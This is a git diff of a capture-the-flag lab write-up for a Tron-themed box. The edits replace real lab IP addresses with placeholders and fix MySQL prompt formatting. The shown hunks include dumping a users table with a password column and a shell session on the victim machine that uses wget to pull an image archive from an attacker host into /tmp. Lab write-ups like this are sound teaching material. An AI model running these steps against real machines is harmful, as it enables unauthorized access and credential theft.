@@ -44,7 +44,7 @@
 
 ### What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step. 
 - **Answer:** Light Cycle
-- **Steps to Reproduce:** Visit `http://10.10.115.106:65000/`
+- **Steps to Reproduce:** Visit `http://<MACHINE_IP>:65000/`
 
 ---
 
@@ -174,8 +174,7 @@
 
     Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
-    mysql> show databases
-        -> ;
+    mysql> show databases;
     +--------------------+
     | Database           |
     +--------------------+
@@ -189,8 +188,7 @@
     You can turn off this feature to get a quicker startup with -A
 
     Database changed
-    mysql> show tables
-        -> ;
+    mysql> show tables;
     +----------------+
     | Tables_in_tron |
     +----------------+
@@ -198,8 +196,7 @@
     +----------------+
     1 row in set (0.00 sec)
 
-    mysql> select * from users
-        -> ;
+    mysql> select * from users;
     +----+----------+----------------------------------+
     | id | username | password                         |
     +----+----------+----------------------------------+
@@ -269,9 +266,9 @@
  - In the victim machine:
     ```bash
     flynn@light-cycle:/$ cd tmp/
-    flynn@light-cycle:/tmp$ wget 10.8.136.111:8000/alpine-3-7-apache-php5-6.tar.bz2.000
-    --2020-12-25 12:59:22--  http://10.8.136.111:8000/alpine-3-7-apache-php5-6.tar.bz2.000
-    Connecting to 10.8.136.111:8000... connected.
+    flynn@light-cycle:/tmp$ wget <YOUR_IP>:8000/alpine-3-7-apache-php5-6.tar.bz2.000
+    --2020-12-25 12:59:22--  http://<YOUR_IP>:8000/alpine-3-7-apache-php5-6.tar.bz2.000
+    Connecting to <YOUR_IP>:8000... connected.
     HTTP request sent, awaiting response... 200 OK
     Length: 13019149 (12M) [application/octet-stream]
     Saving to: ‘alpine-3-7-apache-php5-6.tar.bz2.000’
